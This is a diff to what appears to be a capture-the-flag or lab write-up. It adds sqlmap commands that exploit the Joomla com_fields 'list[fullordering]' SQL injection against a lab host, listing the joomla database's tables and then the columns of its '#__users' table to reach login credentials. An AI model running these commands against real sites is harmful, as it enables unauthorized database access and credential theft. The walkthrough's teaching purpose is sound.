@@ -350,7 +350,17 @@ sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal
 sqlmap -u "http://10.10.30.43/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 
 --tables -D joomla
 ```
-
+`-u`: Where to run the script  
+Everything between the IP and “list[fullordering] is part of the exploit (which has to be present when investigating the database)
+`--tables`: We want to understand the tables of the database first  
+`-D`: Specify what database to attack (joomla since we want credentials to the login)  
+```
+sqlmap -u "http://10.10.30.43/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 
+--columns -D joomla -T '#__users'
+```  
+`--columns`: We want to extract columns from the database  
+`-T`: What table to extract columns from  
+The script remains there, as with the tables-attack
 
 
 
